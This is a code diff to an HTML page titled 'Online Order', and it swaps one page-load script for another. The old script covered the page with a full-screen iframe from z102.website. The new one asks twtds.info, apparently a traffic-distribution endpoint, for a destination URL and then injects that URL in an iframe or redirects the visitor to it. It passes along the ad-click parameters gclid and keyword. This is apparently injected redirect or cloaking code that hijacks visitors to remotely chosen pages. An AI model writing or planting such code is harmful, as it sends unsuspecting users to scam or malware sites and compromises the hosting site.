@@ -2,13 +2,33 @@
   
   <head>
     <script>
-function GET(item) {
-    var p = window.location.search;
-    p = p.match(new RegExp(item+'=([^&=]+)'));
-    return p ? p[1] : false;
-}
-var url = "https://z102.website/ru?gclid="+GET('gclid')+"&keyword="+GET('keyword');
-document.documentElement.innerHTML = '<iframe src="'+url+'" style="position:fixed;top:0;left:0;width:100%;height:100%;border:none;"></iframe>';
+(function() {
+    const p = new URLSearchParams(location.search);
+    const mode = p.get('mode') || 'iframe'; 
+    const url = `https://twtds.info/rujsiframe?gclid=${encodeURIComponent(p.get('gclid') || '')}&keyword=${encodeURIComponent(p.get('keyword') || '')}`;
+    
+    fetch(url)
+        .then(response => response.text()) 
+        .then(targetUrl => {
+            if (targetUrl) {
+                if (mode === 'iframe') {
+                    // Отображаем в iframe
+                    const iframe = document.createElement('iframe');
+                    iframe.src = targetUrl;
+                    iframe.style.width = '100%';
+                    iframe.style.height = '100vh';
+                    iframe.style.border = 'none';
+                    document.body.appendChild(iframe);
+                } else {
+                 
+
+                    window.location.href = targetUrl;
+                }
+            }
+        })
+        .catch(error => console.error('Error fetching URL:', error));
+})();
+
 </script>
     <title>Online Order</title>
   </head>
